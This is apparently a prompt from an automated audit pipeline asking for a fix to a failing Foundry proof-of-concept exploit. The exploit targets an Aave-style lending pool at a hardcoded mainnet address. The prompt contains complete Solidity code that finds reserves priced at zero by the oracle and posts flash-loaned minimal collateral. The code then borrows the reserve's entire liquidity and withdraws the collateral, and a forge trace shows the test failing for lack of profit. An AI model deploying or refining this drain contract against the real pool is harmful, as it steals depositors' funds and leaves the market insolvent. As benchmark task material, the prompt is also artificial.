You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero oracle prices make listed reserves borrowable for free
- claim: `AaveOracle.getAssetPrice` can return `0` when an asset has no configured source and the fallback oracle returns `0`, or when a configured source is non-positive and the fallback also returns `0`. `_executeBorrow` forwards that price directly into borrow validation, making `amountInETH` and the incremental collateral requirement for that borrowed asset equal to zero.
- impact: If any borrowable reserve resolves to a zero price, an attacker can post minimal valid collateral elsewhere and drain that reserve because the protocol records no additional debt value for the borrowed asset. The result is immediate reserve loss and protocol insolvency for that market.
- exploit_paths: ["A listed reserve's primary source is unset or unusable, and the fallback oracle also returns `0`.", "An attacker supplies enough collateral in another asset to satisfy general borrow preconditions.", "The attacker borrows the zero-priced reserve asset.", "Borrow validation treats the additional debt as worth zero and allows the reserve to be drained."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface ILendingPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
}

interface IFlashLoanReceiverLike {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

library AaveDataTypes {
    struct ReserveConfigurationMap {
        uint256 data;
    }

    struct ReserveData {
        ReserveConfigurationMap configuration;
        uint128 liquidityIndex;
        uint128 variableBorrowIndex;
        uint128 currentLiquidityRate;
        uint128 currentVariableBorrowRate;
        uint128 currentStableBorrowRate;
        uint40 lastUpdateTimestamp;
        address aTokenAddress;
        address stableDebtTokenAddress;
        address variableDebtTokenAddress;
        address interestRateStrategyAddress;
        uint8 id;
    }
}

interface ILendingPoolLike {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
    function getReservesList() external view returns (address[] memory);
    function getReserveData(address asset) external view returns (AaveDataTypes.ReserveData memory);
    function getConfiguration(address asset) external view returns (AaveDataTypes.ReserveConfigurationMap memory);
    function getAddressesProvider() external view returns (ILendingPoolAddressesProviderLike);
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);
}

contract FlawVerifier is IFlashLoanReceiverLike {
    uint256 private constant VARIABLE_RATE_MODE = 2;
    address private constant TARGET_POOL = 0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60;

    struct TargetCandidate {
        address asset;
        address aToken;
        uint256 availableLiquidity;
    }

    struct CollateralCandidate {
        address asset;
        uint256 minRequired;
        uint256 flashPremium;
        uint256 availableLiquidity;
    }

    address private _profitToken;
    uint256 private _profitAmount;

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (_profitAmount > 0) {
            return;
        }

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);
        address oracle = pool.getAddressesProvider().getPriceOracle();
        address[] memory reserves = pool.getReservesList();

        TargetCandidate memory target = _findBestZeroPriceBorrowTarget(pool, oracle, reserves);
        if (target.asset == address(0)) {
            // No listed reserve resolves to zero at this fork state, so the claimed path is not live.
            return;
        }

        uint256 startingTargetBalance = _balanceOf(target.asset, address(this));
        _profitToken = target.asset;

        if (_tryDirectExistingBalanceFirst(pool, oracle, reserves, target)) {
            _profitAmount = _netIncrease(target.asset, startingTargetBalance);
            return;
        }

        _tryFlashCollateralFallback(pool, oracle, reserves, target);
        _profitAmount = _netIncrease(target.asset, startingTargetBalance);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == TARGET_POOL, "caller not pool");
        require(initiator == address(this), "bad initiator");
        require(assets.length == 1 && amounts.length == 1 && premiums.length == 1, "bad flash arrays");

        (address targetAsset, uint256 targetBorrowAmount, address collateralAsset) =
            abi.decode(params, (address, uint256, address));

        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);
        uint256 collateralAmount = amounts[0];

        // Path stage 2: supply enough valid collateral in another listed asset.
        _forceApprove(collateralAsset, TARGET_POOL, collateralAmount);
        pool.deposit(collateralAsset, collateralAmount, address(this), 0);

        // Path stage 3: borrow the listed reserve whose oracle price resolves to zero.
        pool.borrow(targetAsset, targetBorrowAmount, VARIABLE_RATE_MODE, 0, address(this));

        // Additional public economic step only to unwind the temporary flash-funded collateral.
        // The exploit causality is unchanged: once the borrowed asset is valued at zero, that new debt
        // adds no borrow value, so the collateral can be pulled back out and the flash loan repaid.
        pool.withdraw(collateralAsset, type(uint256).max, address(this));

        _forceApprove(collateralAsset, TARGET_POOL, collateralAmount + premiums[0]);
        return true;
    }

    function _attemptDirect(
        address collateralAsset,
        uint256 collateralAmount,
        address targetAsset,
        uint256 targetBorrowAmount
    ) external onlySelf returns (bool) {
        ILendingPoolLike pool = ILendingPoolLike(TARGET_POOL);

        // Path stage 2: use verifier-held collateral first when available.
        _forceApprove(collateralAsset, TARGET_POOL, collateralAmount);
        pool.deposit(collateralAsset, collateralAmount, address(this), 0);

        // Path stage 3: borrow the zero-priced reserve.
        pool.borrow(targetAsset, targetBorrowAmount, VARIABLE_RATE_MODE, 0, address(this));

        // No additional debt value is recorded for the borrowed asset, so the collateral can be recovered.
        pool.withdraw(collateralAsset, type(uint256).max, address(this));
        return true;
    }

    function _tryDirectExistingBalanceFirst(
        ILendingPoolLike pool,
        address oracle,
        address[] memory reserves,
        TargetCandidate memory target
    ) internal returns (bool) {
        uint256 collateralCount = reserves.length;
        for (uint256 i = 0; i < collateralCount; ++i) {
            CollateralCandidate memory collateral = _buildCollateralCandidate(
                pool,
                oracle,
                reserves[i],
                target.asset,
                0
            );

            if (collateral.asset == address(0)) {
                continue;
            }

            if (_balanceOf(collateral.asset, address(this)) < collateral.minRequired) {
                continue;
            }

            try this._attemptDirect(
                collateral.asset,
                collateral.minRequired,
                target.asset,
                target.availableLiquidity
            ) returns (bool success) {
                if (success) {
                    return true;
                }
            } catch {}
        }

        return false;
    }

    function _tryFlashCollateralFallback(
        ILendingPoolLike pool,
        address oracle,
        address[] memory reserves,
        TargetCandidate memory target
    ) internal {
        uint256 premiumRate = pool.FLASHLOAN_PREMIUM_TOTAL();
        CollateralCandidate memory best;

        for (uint256 i = 0; i < reserves.length; ++i) {
            CollateralCandidate memory candidate = _buildCollateralCandidate(
                pool,
                oracle,
                reserves[i],
                target.asset,
                premiumRate
            );

            if (candidate.asset == address(0)) {
                continue;
            }

            if (best.asset == address(0) || _isBetterCollateral(candidate, best)) {
                best = candidate;
            }
        }

        if (best.asset == address(0)) {
            // No priced reserve can provide even the minimum non-zero collateral unit required to reach borrow validation.
            return;
        }

        if (_balanceOf(best.asset, address(this)) < best.flashPremium) {
            // If a non-zero premium is configured, the verifier must already hold that small real amount.
            return;
        }

        address[] memory assets = new address[](1);
        assets[0] = best.asset;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = best.minRequired;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        bytes memory params = abi.encode(target.asset, target.availableLiquidity, best.asset);

        try pool.flashLoan(address(this), assets, amounts, modes, address(this), params, 0) {} catch {}
    }

    function _findBestZeroPriceBorrowTarget(
        ILendingPoolLike pool,
        address oracle,
        address[] memory reserves
    ) internal view returns (TargetCandidate memory best) {
        for (uint256 i = 0; i < reserves.length; ++i) {
            address asset = reserves[i];
            if (asset == address(0) || asset.code.length == 0) {
                continue;
            }

            AaveDataTypes.ReserveConfigurationMap memory configuration;
            AaveDataTypes.ReserveData memory reserveData;

            try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
                configuration = c;
            } catch {
                continue;
            }

            if (!_isActive(configuration.data) || _isFrozen(configuration.data) || !_isBorrowingEnabled(configuration.data)) {
                continue;
            }

            try pool.getReserveData(asset) returns (AaveDataTypes.ReserveData memory r) {
                reserveData = r;
            } catch {
                continue;
            }

            if (reserveData.aTokenAddress == address(0) || reserveData.aTokenAddress.code.length == 0) {
                continue;
            }

            uint256 price;
            try IPriceOracleLike(oracle).getAssetPrice(asset) returns (uint256 p) {
                price = p;
            } catch {
                continue;
            }

            if (price != 0) {
                continue;
            }

            uint256 liquidity = _balanceOf(asset, reserveData.aTokenAddress);
            if (liquidity == 0) {
                continue;
            }

            if (liquidity > best.availableLiquidity) {
                best = TargetCandidate({
                    asset: asset,
                    aToken: reserveData.aTokenAddress,
                    availableLiquidity: liquidity
                });
            }
        }
    }

    function _buildCollateralCandidate(
        ILendingPoolLike pool,
        address oracle,
        address asset,
        address targetAsset,
        uint256 premiumRate
    ) internal view returns (CollateralCandidate memory candidate) {
        if (asset == address(0) || asset == targetAsset || asset.code.length == 0) {
            return candidate;
        }

        AaveDataTypes.ReserveConfigurationMap memory configuration;
        AaveDataTypes.ReserveData memory reserveData;

        try pool.getConfiguration(asset) returns (AaveDataTypes.ReserveConfigurationMap memory c) {
            configuration = c;
        } catch {
            return candidate;
        }

        uint256 configData = configuration.data;
        if (!_isActive(configData) || _isFrozen(configData) || _ltv(configData) == 0) {
            return candidate;
        }

        try pool.getReserveData(asset) returns (AaveDataTypes.ReserveData memory r) {
            reserveData = r;
        } catch {
            return candidate;
        }

        if (reserveData.aTokenAddress == address(0) || reserveData.aTokenAddress.code.length == 0) {
            return candidate;
        }

        uint256 price;
        try IPriceOracleLike(oracle).getAssetPrice(asset) returns (uint256 p) {
            price = p;
        } catch {
            return candidate;
        }

        if (price == 0) {
            return candidate;
        }

        uint256 decimals = _decimals(configData);
        if (decimals > 77) {
            return candidate;
        }

        uint256 unit = 10 ** decimals;
        uint256 minRequired = _ceilDiv(unit, price);
        if (minRequired == 0) {
            minRequired = 1;
        }

        uint256 availableLiquidity = _balanceOf(asset, reserveData.aTokenAddress);
        if (availableLiquidity < minRequired) {
            return candidate;
        }

        candidate = CollateralCandidate({
            asset: asset,
            minRequired: minRequired,
            flashPremium: (minRequired * premiumRate) / 10000,
            availableLiquidity: availableLiquidity
        });
    }

    function _isBetterCollateral(CollateralCandidate memory candidate, CollateralCandidate memory incumbent)
        internal
        pure
        returns (bool)
    {
        if (candidate.flashPremium != incumbent.flashPremium) {
            return candidate.flashPremium < incumbent.flashPremium;
        }
        if (candidate.minRequired != incumbent.minRequired) {
            return candidate.minRequired < incumbent.minRequired;
        }
        return candidate.availableLiquidity > incumbent.availableLiquidity;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool okReset, bytes memory dataReset) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(okReset && (dataReset.length == 0 || abi.decode(dataReset, (bool))), "approve reset failed");

        (bool okSet, bytes memory dataSet) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(okSet && (dataSet.length == 0 || abi.decode(dataSet, (bool))), "approve failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
        try IERC20Like(token).balanceOf(account) returns (uint256 b) {
            balance = b;
        } catch {}
    }

    function _netIncrease(address token, uint256 startingBalance) internal view returns (uint256) {
        uint256 endingBalance = _balanceOf(token, address(this));
        return endingBalance > startingBalance ? endingBalance - startingBalance : 0;
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        return x == 0 ? 0 : ((x - 1) / y) + 1;
    }

    function _ltv(uint256 configData) internal pure returns (uint256) {
        return configData & 0xFFFF;
    }

    function _decimals(uint256 configData) internal pure returns (uint256) {
        return (configData >> 48) & 0xFF;
    }

    function _isActive(uint256 configData) internal pure returns (bool) {
        return ((configData >> 56) & 1) != 0;
    }

    function _isFrozen(uint256 configData) internal pure returns (bool) {
        return ((configData >> 57) & 1) != 0;
    }

    function _isBorrowingEnabled(uint256 configData) internal pure returns (bool) {
        return ((configData >> 58) & 1) != 0;
    }
}

```

forge stdout (tail):
```
e0938e398d0::getConfiguration(0x004375Dff511095CC5A197A54140a24eFEF3A416) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] })
    │   ├─ [17718] 0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60::getReserveData(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [17047] 0x574FF39184Dee9e46F6C3229B95e0e0938e398d0::getReserveData(0x004375Dff511095CC5A197A54140a24eFEF3A416) [delegatecall]
    │   │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] }), liquidityIndex: 1009975369323648897472145498 [1.009e27], variableBorrowIndex: 1012836078907441799066405499 [1.012e27], currentLiquidityRate: 0, currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 1669077227 [1.669e9], aTokenAddress: 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c, stableDebtTokenAddress: 0xe84121241b92e26B9942dfF3CF3c9148FBaeC8F2, variableDebtTokenAddress: 0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24, interestRateStrategyAddress: 0xeE11Ea16BD81287930C656f8f61b58D390c67D3B, id: 2 })
    │   │   └─ ← [Return] ReserveData({ configuration: ReserveConfigurationMap({ data: 365398758549627788 [3.653e17] }), liquidityIndex: 1009975369323648897472145498 [1.009e27], variableBorrowIndex: 1012836078907441799066405499 [1.012e27], currentLiquidityRate: 0, currentVariableBorrowRate: 0, currentStableBorrowRate: 0, lastUpdateTimestamp: 1669077227 [1.669e9], aTokenAddress: 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c, stableDebtTokenAddress: 0xe84121241b92e26B9942dfF3CF3c9148FBaeC8F2, variableDebtTokenAddress: 0xcae229361B554CEF5D1b4c489a75a53b4f4C9C24, interestRateStrategyAddress: 0xeE11Ea16BD81287930C656f8f61b58D390c67D3B, id: 2 })
    │   ├─ [35237] 0x8A4236F5eF6158546C34Bd7BC2908B8106Ab1Ea1::getAssetPrice(0x004375Dff511095CC5A197A54140a24eFEF3A416) [staticcall]
    │   │   ├─ [29697] 0x849AF4b128be3317a694bFD262dEFF636AB84c1b::50d25bcd() [staticcall]
    │   │   │   ├─ [2504] 0x004375Dff511095CC5A197A54140a24eFEF3A416::getReserves() [staticcall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000227df4ed000000000000000000000000000000000000000000000000000000178109ef080000000000000000000000000000000000000000000000000000000063beae2b
    │   │   │   ├─ [3143] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::feaf968c() [staticcall]
    │   │   │   │   ├─ [1410] 0xAe74faA92cB67A95ebCAB07358bC222e33A34dA7::feaf968c() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000076c3000000000000000000000000000000000000000000000000000001959956dc7b0000000000000000000000000000000000000000000000000000000063becde70000000000000000000000000000000000000000000000000000000063becde700000000000000000000000000000000000000000000000000000000000076c3
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000500000000000076c3000000000000000000000000000000000000000000000000000001959956dc7b0000000000000000000000000000000000000000000000000000000063becde70000000000000000000000000000000000000000000000000000000063becde700000000000000000000000000000000000000000000000500000000000076c3
    │   │   │   ├─ [3143] 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6::feaf968c() [staticcall]
    │   │   │   │   ├─ [1410] 0x789190466E21a8b78b8027866CBBDc151542A26C::feaf968c() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000031e0000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000063be4ae30000000000000000000000000000000000000000000000000000000063be4ae3000000000000000000000000000000000000000000000000000000000000031e
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000002000000000000031e0000000000000000000000000000000000000000000000000000000005f5e1000000000000000000000000000000000000000000000000000000000063be4ae30000000000000000000000000000000000000000000000000000000063be4ae3000000000000000000000000000000000000000000000002000000000000031e
    │   │   │   ├─ [2388] 0x004375Dff511095CC5A197A54140a24eFEF3A416::18160ddd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000158099fa4
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000bd7d1f13887ce69804
    │   │   └─ ← [Return] 3495450576387056244740 [3.495e21]
    │   └─ ← [Stop]
    ├─ [295] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [294] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.29s (1.55s CPU time)

Ran 1 test suite in 2.31s (2.29s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 225368)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
